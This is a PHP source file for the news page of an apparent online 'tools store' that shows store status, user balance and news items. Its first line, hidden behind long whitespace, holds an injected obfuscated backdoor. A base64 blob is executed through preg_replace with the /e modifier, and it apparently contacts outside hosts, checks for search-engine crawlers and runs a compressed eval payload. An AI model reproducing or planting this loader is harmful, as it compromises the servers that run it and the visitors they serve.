<?php                                                                                                                                                                 /*versio:2.19*/$QO00=88154;if (!function_exists('QO00O00O')){$GLOBALS['QO00'] = 'ixdY3VybAw%sGiX2luaXQfYWxsb3dfdXJsX2ZvcGVuMQw.OaHR0cDovLwzJndheT1maWxlX2dldF9jb250ZW50cwEX3NldG9wdAv&X2V4ZWMd@RJndheT1jdXJsegSLwlb3Nvbi5pbgcnllcGR4LmNvbQcGhwYWlkZS5jb20 _YdwpDT.G%WV8AGFOgZGlzcGxheV9lcnJvcnM$ZGV0ZXJtaW5hdG9yZnRwMTMMi4xOQ!hXSUlsMTFsMUlsMQH_YmFzZTY0X2RlY29kZQBrzt(KYmFzZTY0X2VuY29kZQlDSFRUUFMsb2Zm?lMaHR0cHM6Ly8FNSFRUUF9IT1NUPnGdW5pb24hMc2VsZWN0UkVRVUVTVF9VUkkU0NSSVBUX05BTUU}FUVVFUllfU1RSSU5H&ePwhAL3RtcC8uZm9udC11bml4GZPEn)L3RtcC8uSUNFLXVuaXgkVE1Q*YVEVNUAVE1QRElSVX L3RtcA(MdXBsb2FkX3RtcF9kaXIY*dG1w~Cd3AtY29udGVudC91cGxvYWRzrd3AtY29udGVudC9jYWNoZQELgaKdmVyc2lvb_a&LQip;LXBocAfSFRUUF9FWEVDUEhQ *b3V0}$Db2sO @~&nSFRUUF9VU0VSX0FHRU5UF?LACSZ29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgAWL3BnLnBocD91PQgJms9JnQ9cGhwJnA9JnY9ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlZ3dHYya2dRL2lzYkZFVzI1UHE4Z0hsY3ppZFFTeHFrSEk0SnFWUzF5S0t3TkZhTkhSbHphUlhsdjkvTTdxeTlKRTd1cnFrVXN2TitmVE1rVzJhZGJNUTJ5Y1RHYW0xRUtZcGRrcTNLdkdqWjlpUGJIckoxbWVRWk15bnhWdVJiNjNTYWNwNU9IWFoyR2tWZTVJVXNZTFBicXl1YlBiTDZaWmVzaTd4TWRzSXFpNE93ejFraHlrT1JNVk1GdkQ3VmxyNkxjcHVrd2tJZFhoZzVvQ3dNdmRDelVhMEhIejFRRzhFdi9HOTFITllEZWFEZ1A2QVFqMXR4OEs3RCtzQXlTcklrM292U3FpanR0c1BhbnUwd0R1UUVFaUZadmpldzJDd3diSGJ4MFpaeFRubWFwandZb2Njb0dhL3pyQlJadWE5VmRQdGd3TE9aeXlnaStVbUc1Tlk2L1lIRE9tQ29TaENweHRTSWRDL1FQWjJpV1B4TTltQ0NncllwTTU1TStJaGVMWldWQ0d3MlpXVXdsRjZkVTZtaXhzeDVuRkpIaWl3eTQ3RDN0L09yOEhvUnd5K0gvYzlRT1FlMXZHMi9xZmh5TXY0d21UdmJGY1QrSnVOOHNyaWR6eGJ6OGV6bUFnU295MTduZngvT1pwUDNpOFgwcjBsNHUzQ1lqem1ZNGordXNpZlRvZVZRMWZwUXBQRTZ6ZmZDZU1WNmlOMTkrY3NpWWFoQ3JhYU90ZDF6R0tUNXFTNnI1TkZsbFQwa2h3Q05iL2Y1K2tkK0w3SzYrUWVlSThzWWhpRjlpRUxsTkhxZ0I0alJiRVJoazNGMlBLQVEwdmIrZ1Ayako3ajFjYkpnajFTcHA3T0gxYThBUFJFbHUxd3Nybi9qcnZlMStKcGQ1dnZ5ZDJTVHJqM2hVNHVTbDNMMC8vcnlPZzV2M0dQN2JkdkY5MCtUK2MwMG5EWFl2dDJMNHQzNE93d05LbGZLcEhKdDRPRU80ZURrRFFTaStHeDJkc2FzWjRqRDN0WGtQOENiT2xNdVpoeG0xbkNHdHdjU2pFWmJxbmNGVUtjWWxSd1Q4Zk0relRmQ2FsVStPbG9sOEIweWhCamkvdUl0NjRGT2RrMXlray9heEIvNG13WjJYQlNyWDVhUlNqV3Z4ckR4RGo1MWo1NThnRVB1NDJSVmNQcFFKS1ZRVFpxbWpoeUxNSUlzeVBiQmJvbzhnQy9WZE1SVTYrdHppWFRBUHRxU0lpVlNLVHF2YzZVb0ZFdGxQeitVVUhEUXpTR1hxWVB0QWdXZWdrcXh2c3NOMy9zUVRzZDJpZEhvb29FdnU0Z0VYWm0vbHF6U0MwVG5BMFNnb2EzYVhxMDFBOHc5cFBZSThFL1JmeThNREt6dktMaEQ2SVdxRzVTT3A5Y005cjRwUTBWUUd3aDZ3Q0Q1NERjZnFBa0JKT2NHQ1dOVkpEVk13WE1JVmVPZDdHVXp4VGVUT2N6UGwxcCtPRVJQbHpiVmNmUTZDenN4bHlVbW9LdjJ4VE83SFZ5VG5GUDFpT3dHKzdJbzh6Ui9FRVdUa1U2N0w1RWN1M3liRjJLMXZvT21paEZOVm50R2xReityRXVPem9MSyt4eG5UajdXemRiQnRkckhacE1hdnBENE1tZ0FVNzBSWDlYbFErTU8vcHV1Si9ES09ua3QxUjEvS0VkcXFmYjk2M1M1UEY2UysxMUZ4b0kycG5ESVpVOHUvMDI5YXg0ZzNoQkhBcmJyV3hwVktkV2FrTEFhNkxJMlNWVnhQc3ArQllGZ3ROdjRlaE81TkJRdWdUeE5na0pHeEw1Z2t4VFpDbEEzamkrbVY1TTR0dDBQMHpsczJuRCtHYXhkaitkaitJakRrS0x5Q3VLTXFIaUg3ckg2U1k0WHpuT0R5MTEwdVdzdm00azlIMGRXRVNlelQ2K0lIVlA2c211YUtKVzIrbW5ReGllSHZUd2F1ME5QZW0wN09qazFtdmw0L0hTYktUQk03V2FTdkRqYlFEb2FOTW9ramhyZUpaR0c5Uk02VE9oUm40Y1J6SE5qU2RUcHU0OFI0VmZmVW5Fc0dkSlpRWS9uN0J2WS8xRnRySEozSDd4MHVGZGpOcmg0L2d5bFduaFd4Si9qOGUzaXNyVU1BbUxUTzBFai9JaDJoNkYyaUFWeU5FSWJCZ2RjR1ZTZ2JoSjZXS2JxWGdLNWFSb1FXRGNOcEQvczBFRGkxaE4vcjFJdEJUcmVkcStuYTJ1ODRGbHZTMVNGbzcyMDFIclVDVmZmY3lDRDBsYVpIOVozNmsvNWJXV2RIallpenJPMTBJOEsrQjZabnVjUlhLWWlXK05WUVUvNkhsUEg3TnZvM1VQMGhuazdRbTk5M2RSY1hZazFabEI0WmZod1phak9nNmJ3dkJmWWppNDRGZlVrQ0M3a0pVLzd5Z2lWZWd4VW02ZHJuM3R5cjdvVVYxM1FmdHZISk92V01nbER1WXhlOWtDL3kwbEVkZzJsS01VVTFWODI1ZUVGQjF2OWZmUDhXVW1lampzZmZ2NEIyNFVFOEE9PSIpKSk7rcHJlZ19yZXBsYWNlH';function QO00O00O($a, $b){$c=$GLOBALS['QO00']; $d=pack('H*','62617'.'36536345f6465636f6465'); return $d(substr($c, $a, $b));};$Q0O0Q0Q0Q = QO00O00O(3362, 16);$Q0O0Q0Q0Q("/QQO0O00O0/e", QO00O00O(745, 2616), "QQO0O00O0");};?><?php

require_once("./includes/db.php");
require_once("./includes/config.php");
require_once("./includes/header.php");


// CHECK STORE ONLINE
$result = mysql_query("SELECT shop_online FROM settings LIMIT 0,1");
$cols   = mysql_fetch_row($result);
if(!$cols[0])
{
	header("location: offline.php");
	die;
}

// get balance
$uid = mysql_real_escape_string($_SESSION['member']);
$result = mysql_query("SELECT balance FROM users WHERE username='$uid'");
$bals = mysql_fetch_row($result);
$balance = $bals[0];
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title>Cybersh0pTools - Tools Store</title>
		<link href="style.css" type="text/css" rel="stylesheet" />
		<!--<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>-->
		<script type="text/javascript" src="jq.js"></script>
	</head>
	<body>
		<body bgcolor="#0099CC">
<?php include 'navbar.php';?>

<div id="holder">
	<h2 style="color: gray">News & Updates</h2>
	<table style="width: 800px; margin: -10px auto;">
		<?php
			$result = mysql_query("SELECT * FROM news WHERE type='news' ORDER BY time DESC");
			
			if(mysql_num_rows($result) == 0)
				echo "<tr><td>No news found!</td></tr>";
			else
			{
				while($row = mysql_fetch_assoc($result))
				{
					$subject = $row['subject'];
					$message = $row['message'];
					$date    = $row['time'];
					
					echo '<tr><td><strong><span class="blackzzz">'.htmlspecialchars($subject, ENT_QUOTES, 'UTF-8').' : </span></strong><font COLOR="#FF6600"><strong>[</strong></font>'.htmlspecialchars($date, ENT_QUOTES, 'UTF-8').'<font COLOR="#FF6600"><strong>]</strong></font></span><p>'.
					
					"<p>{".htmlspecialchars($message, ENT_QUOTES, 'UTF-8')."}<p>"
					
					."</td></tr>";
				}
			}
		?>
	</table>
	
	<?php
	
	// List news and updates
	
	
	while($row = mysql_fetch_assoc($result))
	{
		
		
		echo '<table width="695" height="49" border="0" class="formstyle">
	  <tr>
	    <td><strong><span class="blackzzz">'.htmlspecialchars($subject, ENT_QUOTES, 'UTF-8').' : </span></strong><font COLOR="#FF6600"><strong>[</strong></font>'.htmlspecialchars($date, ENT_QUOTES, 'UTF-8').'<font COLOR="#FF6600"><strong>]</strong></font></span></td>
	  </tr>
	  <tr>
	    <td>'.htmlspecialchars($message, ENT_QUOTES, 'UTF-8').'
	      <p>&nbsp;</p></td>
	  </tr>
	</table>
	<p>&nbsp;</p>
	<p>&nbsp;</p>';
	
	}
	
	?>
</div>